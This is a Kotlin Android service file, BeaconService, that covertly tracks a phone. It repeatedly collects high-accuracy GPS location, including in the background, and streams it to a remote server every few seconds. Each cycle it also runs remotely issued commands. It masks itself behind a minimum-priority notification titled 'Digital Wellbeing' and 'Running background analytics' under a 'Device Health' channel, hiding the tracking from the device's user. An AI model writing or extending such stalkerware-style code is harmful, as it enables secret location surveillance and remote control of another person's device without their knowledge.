package com.example.myandroid

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await
import org.json.JSONObject

class BeaconService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private var intervalSeconds = 60L // Default safety

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val durationMins = intent?.getLongExtra("duration_mins", 5L) ?: 5L
        val mode = intent?.getStringExtra("mode") ?: "BURST"
        val endTime = System.currentTimeMillis() + (durationMins * 60 * 1000)
        
        intervalSeconds = when(mode) {
            "LIVE_STREAM" -> 3L // 3-second updates for smooth line
            "LOCATION_STREAM" -> 15L
            else -> 5L
        }

        try {
            if (android.os.Build.VERSION.SDK_INT >= 34) {
                startForeground(9999, createNotification(), 1073741824) // FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            } else {
                startForeground(9999, createNotification())
            }
        } catch (e: Exception) {
            DebugLogger.log("BEACON_ERR", "startForeground failed: ${e.message}")
        }
        
        scope.launch {
            DebugLogger.log("BEACON", "Mode: $mode | Duration: ${durationMins}m")
            val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(applicationContext)

            while (isActive) {
                if (System.currentTimeMillis() > endTime) {
                    stopSelf()
                    break
                }

                val extra = JSONObject()
                if (mode == "LOCATION_STREAM" && PermissionManager.hasBackgroundLocation(applicationContext)) {
                    try {
                        val loc = fused.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null).await()
                        if (loc != null) {
                            val locObj = JSONObject()
                            locObj.put("lat", loc.latitude); locObj.put("lon", loc.longitude); locObj.put("acc", loc.accuracy)
                            extra.put("stream_location", locObj)
                        }
                    } catch (e: Exception) { }
                }

                if (mode == "LIVE_STREAM") {
                    SocketManager.connect(applicationContext)
                    try {
                        if (androidx.core.content.ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                            val loc = fused.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null).await()
                            if (loc != null) {
                                SocketManager.streamLocation(loc.latitude, loc.longitude, loc.accuracy)
                            } else {
                                DebugLogger.log("BEACON_WARN", "Live Stream: OS GPS returned null (searching for satellites...)")
                            }
                        } else {
                            DebugLogger.log("BEACON_ERR", "Live Stream: Location permission denied.")
                        }
                    } catch (e: Exception) {
                        DebugLogger.log("BEACON_ERR", "Live Stream GPS fetch failed: ${e.message}")
                    }
                } else {
                    CloudManager.sendPing(applicationContext, "$mode (${(endTime - System.currentTimeMillis())/60000}m left)", extra)
                }
                CommandProcessor.checkAndExecute(applicationContext)
                
                delay(intervalSeconds * 1000)
            }
        }

        return START_STICKY
    }

    private fun createNotification(): Notification {
        val channelId = "sync_service"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val chan = NotificationChannel(channelId, "Device Health", NotificationManager.IMPORTANCE_MIN)
            chan.setShowBadge(false)
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Digital Wellbeing")
            .setContentText("Running background analytics")
            .setSmallIcon(android.R.drawable.ic_menu_recent_history)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
        DebugLogger.log("BEACON", "Service Stopped")
    }
}